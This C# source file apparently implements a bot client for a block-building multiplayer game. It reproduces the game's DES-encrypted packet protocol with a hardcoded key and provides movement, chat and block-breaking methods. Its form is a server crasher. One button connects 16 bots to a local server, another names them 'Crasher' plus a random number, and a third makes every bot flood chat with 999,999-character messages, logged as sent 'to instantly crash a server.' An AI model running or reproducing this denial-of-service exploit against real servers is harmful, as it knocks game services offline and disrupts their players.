using System;
using System.Collections.Generic;
using global::System.IO;
using System.Linq;
using global::System.Net.Sockets;
using global::System.Security.Cryptography;
using global::System.Text;
using Microsoft.VisualBasic;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using System.Collections.Specialized;
using System.Drawing;
using System.Threading;

namespace ProjectTested
{
    public partial class Form1
    {
        internal static Form1 instance;
        public static Form1 getInstance()
        {
            return instance;
        }

        public Form1()
        {
            InitializeComponent();
            _Button1.Name = "Button1";
            _Button2.Name = "Button2";
            _Button3.Name = "Button3";
        }

        private List<GameClient> clients = new List<GameClient>();
        private Random rnd = new Random();

        private void Button1_Click(object sender, EventArgs e)
        {
            for (int i = 1; i <= 16; i++)
            {
                var c = new GameClient();
                c.Connect("127.0.0.1", 6575);
                clients.Add(c);
            }

            append("Connected new 16 clients.");
        }

        public void append(string a)
        {
            RichTextBox1.AppendText(a + Constants.vbCrLf);
            {
                var withBlock = RichTextBox1;
                withBlock.Select(withBlock.TextLength, 0);
                withBlock.ScrollToCaret();
            }
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            foreach (var c in clients)
            {
                string n = "Crasher" + rnd.Next(1, 999999).ToString();
                c.Send($"setname?{n}?english");
                c.Name = n;
            }

            System.Threading.Thread.Sleep(10);
            foreach (var c in clients)
                c.Send($"world");
            System.Threading.Thread.Sleep(2000);
            foreach (var c in clients)
                c.Send($"chat?8023");
            append("Bots setup correctly.");
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            foreach (var c in clients)
                c.Send("chat?" + new string('x', 999999));
            foreach (var c in clients)
                c.Send("chat?" + new string('x', 999999));
            foreach (var c in clients)
                c.Send("chat?" + new string('x', 999999));
            append("All bots sent very long message to instantly crash a server.");
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            CheckForIllegalCrossThreadCalls = false;
            instance = this;
        }
    }

    public class Block
    {
        public string BlockType;
        public int X;
        public int Y;
        public Rectangle rectangle;

        public Block(string a, int b, int c)
        {
            BlockType = a;
            X = b;
            Y = c;
            rectangle = new Rectangle(b * 32, c * 32, 32, 32);
        }

        public void SendBreak(GameClient client)
        {
            client.Send("block_break?" + X.ToString() + "?" + Y.ToString());
            client.blocks.Remove(this);
        }
    }

    public class EntityPlayer
    {
        public string Username;
        public int X = 0;
        public int Y = 0;
        public string SelectedItem;

        public EntityPlayer(string name)
        {
            Username = name;
            SelectedItem = "";
        }
    }

    public class Conversions
    {
        public static int ToInteger(object value)
        {
            return int.Parse(value.ToString());
        }
    }

    public class GameClient
    {
        public string Name { get; set; }

        // API START

        internal List<Block> blocks = new List<Block>();
        internal List<EntityPlayer> players = new List<EntityPlayer>();
        internal StringCollection items = new StringCollection();
        internal Point location = new Point(0,0);
        internal Rectangle rectanglePlayer;
        private string selectedItem;

        public void SetName(string n)
        {
            Send("setname?" + n);
            Name = n;
        }

        public void EquipItem(string n)
        {
            if(!items.Contains(n))
            {
                throw new Exception("Trying to equip item that player doesn't in inventory.");
                return;
            }
            Send("selectitem?" + n);
            selectedItem = n;
        }

        public string GetSelectedItem()
        {
            return selectedItem;
        }

        // Use Block.SendBreak(GameClient) instead.
        public void BreakBlock(int x, int y)
        {
            foreach (Block i in blocks)
            {
                if (i.X == x)
                {
                    if (i.Y == y)
                    {
                        i.SendBreak(this);
                        break;
                    }
                }
            }
        }

        public Block[] FindBlocks(string blocktype, int max = -1)
        {
            List<Block> blocks = new List<Block>();
            foreach(Block b in this.blocks)
            {
                if(b.BlockType == blocktype)
                {
                    blocks.Add(b);
                    if (blocks.Count == max) break;
                }
            }
            return blocks.Count > 0 ? blocks.ToArray() : null;
        }

        internal delegate void CompleteLoadEventHandler();
        internal event CompleteLoadEventHandler LoadCompleted;

        internal delegate void BlockAddEventHandler();
        internal event BlockAddEventHandler BlockAdded;

        internal delegate void BlockRemovedEventHandler();
        internal event BlockRemovedEventHandler BlockRemoved;

        internal delegate void ChatMessageEventHandler(string message);
        internal event ChatMessageEventHandler ChatMessage;

        internal delegate void InventoryUpdateEventHandler();
        internal event InventoryUpdateEventHandler InventoryUpdate;

        internal delegate void PlayerAddedEventHandler(EntityPlayer player);
        internal event PlayerAddedEventHandler PlayerAdded;

        internal delegate void PlayerRemovedEventHandler(EntityPlayer player);
        internal event PlayerRemovedEventHandler PlayerRemoved;

        internal delegate void PlayerEquipEventHandler(EntityPlayer player);
        internal event PlayerEquipEventHandler PlayerEquipItem;

        internal delegate void PlayerMoveEventHandler(EntityPlayer player, Point to, Point from);
        internal event PlayerMoveEventHandler PlayerMove;

        internal delegate void ForcedMoveEventHandler(Point to);
        internal event ForcedMoveEventHandler ForcedMove;

        internal delegate void GravityEventHandler(Point to);
        internal event GravityEventHandler Gravity;

        // API END

        private TcpClient client;
        private StreamWriter sWriter;

        private void Read(IAsyncResult ar)
        {
            try
            {
                string x = Encode.d(new StreamReader(client.GetStream()).ReadLine());
                Packet(x);
                client.GetStream().BeginRead(new byte[] { 0 }, 0, 0, Read, null);
            }
            catch (Exception ex)
            {
            }
        }

        internal void updateRectangle()
        {
            rectanglePlayer = new Rectangle(location, new Size(47, 92));
        }

        public void Packet(string x)
        {
            updateRectangle();
            var a = x.Split('?');
            if (a[0] == "chat")
            {
                var m = string.Join("?", a.Skip(1).ToArray());
                //Console.WriteLine($"[CHAT] > {m}");
                ChatMessage?.Invoke(m);
            }
            if (a[0] == "blockchange")
            {
                blocks.Add(new Block(a[3], Conversions.ToInteger(a[1]), Conversions.ToInteger(a[2])));
                BlockAdded?.Invoke();
            }
            if(a[0] == "completeload")
            {
                LoadCompleted?.Invoke();
                Thread thread = new Thread(gravityLoop);
                thread.Start();
            }
            if (a[0] == "removeblock")
            {
                foreach (Block i in blocks)
                {
                    if (i.X == Conversions.ToInteger(a[1]))
                    {
                        if (i.Y == Conversions.ToInteger(a[2]))
                        {
                            blocks.Remove(i);
                            BlockRemoved?.Invoke();
                            break;
                        }
                    }
                }
            }
            if (a[0] == "clearinventory")
            {
                items.Clear();
                InventoryUpdate?.Invoke();
            }
            if (a[0] == "additem")
            {
                items.Add(a[1]);
                InventoryUpdate?.Invoke();
            }
            if (a[0] == "addplayer")
            {
                EntityPlayer player = new EntityPlayer(a[1]);
                players.Add(player);
                PlayerAdded?.Invoke(player);
            }
            if (a[0] == "removeplayer")
            {
                EntityPlayer player = null;
                foreach (var p in players)
                {
                    if (p.Username == a[1])
                    {
                        player = p;
                        break;
                    }
                }
                if (player == null) throw new NullReferenceException("Ссылка на объект не указывает на экземпляр объекта.");
                players.Remove(player);
                PlayerRemoved?.Invoke(player);
            }
            if (a[0] == "itemset")
            {
                if(a[1] == "@")
                {
                    selectedItem = a[2];
                } else
                {
                    EntityPlayer player = null;
                    foreach (var p in players)
                    {
                        if (p.Username == a[1])
                        {
                            player = p;
                            break;
                        }
                    }
                    if (player == null) throw new NullReferenceException("Ссылка на объект не указывает на экземпляр объекта.");
                    player.SelectedItem = a[2];
                    PlayerEquipItem?.Invoke(player);
                }
            }
            if (a[0] == "teleport")
            {
                ForcedMove?.Invoke(new Point(Conversions.ToInteger(a[1]), Conversions.ToInteger(a[2])));
                location = new Point(Conversions.ToInteger(a[1]), Conversions.ToInteger(a[2]));
            }
            if(a[0] == "updateplayerposition")
            {
                EntityPlayer player = null;
                foreach (var p in players)
                {
                    if (p.Username == a[1])
                    {
                        player = p;
                        break;
                    }
                }
                if (player == null) throw new NullReferenceException("Ссылка на объект не указывает на экземпляр объекта.");
                Point from = new Point(player.X, player.Y);
                Point to = new Point(Conversions.ToInteger(a[2]), Conversions.ToInteger(a[3]));
                PlayerMove?.Invoke(player, from, to);
                player.X = Conversions.ToInteger(a[2]);
                player.Y = Conversions.ToInteger(a[3]);
            }
        }

        private void handleGravity()
        {
            foreach(var i in blocks)
            {
                if(i.rectangle.IntersectsWith(rectanglePlayer))
                {
                    if (i.BlockType == "WATER") continue;
                    if (i.BlockType == "SAPLING") continue;
                    return;
                }
            }
            location.Y += 1;
            updateRectangle();
            UpdatePlayerPosition();
            Gravity?.Invoke(location);
        }
        int jumpStep = -1;

        private void gravityLoop()
        {
            while(true)
            {
                Thread.Sleep(10);
                handleGravity();
                if(jumpStep != -1)
                {
                    jumpStep++;
                    location.Y -= 10;
                    UpdatePlayerPosition();
                    if (jumpStep == 5) jumpStep = -1;
                }
            }
        }

        public void Jump()
        {
            jumpStep = 0;
        }

        public void Chat(string message)
        {
            Send("chat?" + message);
        }

        private void move(int direction)
        {
            location.X += direction;
            UpdatePlayerPosition();
        }

        public void UpdatePlayerPosition()
        {
            Send("entityplayermove?" + location.X.ToString() + "?" + location.Y.ToString());
            updateRectangle();
        }

        public void MoveLeft()
        {
            move(-1);
        }

        public void MoveRight()
        {
            move(1);
        }

        public void Send(string str)
        {
            try
            {
                sWriter = new StreamWriter(client.GetStream());
                sWriter.WriteLine(Encode.e(str));
                sWriter.Flush();
            }
            catch (Exception ex)
            {

            }
        }

        public void Connect(string ip, int port)
        {
            try
            {
                client = new TcpClient(ip, port);
                client.GetStream().BeginRead(new byte[] { 0 }, 0, 0, new AsyncCallback(Read), null);
            }
            catch (Exception ex)
            {
                // Close()
            }
        }

        public void Disconnect()
        {
            client.Client.Close();
            client = null;
        }
    }

    internal class Encode
    {
        protected static byte[] a = new byte[] { 62, 59, 25, 19, 37 };
        protected static readonly byte[] b = new byte[] { 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF };
        protected const string c = "YmFuIHRlYmUgZXNsaSB1em5hbCBldG90IGtvZA==";

        public static string d(string stringToDecrypt)
        {
            try
            {
                var inputByteArray = new byte[stringToDecrypt.Length + 1];
                a = Encoding.UTF8.GetBytes(Strings.Left(Encoding.ASCII.GetString(Convert.FromBase64String(c)), 8));
                var des = new DESCryptoServiceProvider();
                inputByteArray = Convert.FromBase64String(stringToDecrypt);
                var ms = new MemoryStream();
                var cs = new CryptoStream(ms, des.CreateDecryptor(a, b), CryptoStreamMode.Write);
                cs.Write(inputByteArray, 0, inputByteArray.Length);
                cs.FlushFinalBlock();
                var encoding = Encoding.UTF8;
                return encoding.GetString(ms.ToArray());
            }
            catch (Exception ex)
            {
                return "";
            }
        }

        public static string e(string stringToEncrypt)
        {
            try
            {
                a = Encoding.UTF8.GetBytes(Strings.Left(Encoding.ASCII.GetString(Convert.FromBase64String(c)), 8));
                var des = new DESCryptoServiceProvider();
                var inputByteArray = Encoding.UTF8.GetBytes(stringToEncrypt);
                var ms = new MemoryStream();
                var cs = new CryptoStream(ms, des.CreateEncryptor(a, b), CryptoStreamMode.Write);
                cs.Write(inputByteArray, 0, inputByteArray.Length);
                cs.FlushFinalBlock();
                return Convert.ToBase64String(ms.ToArray());
            }
            catch (Exception ex)
            {
                return "";
            }
        }
    }
}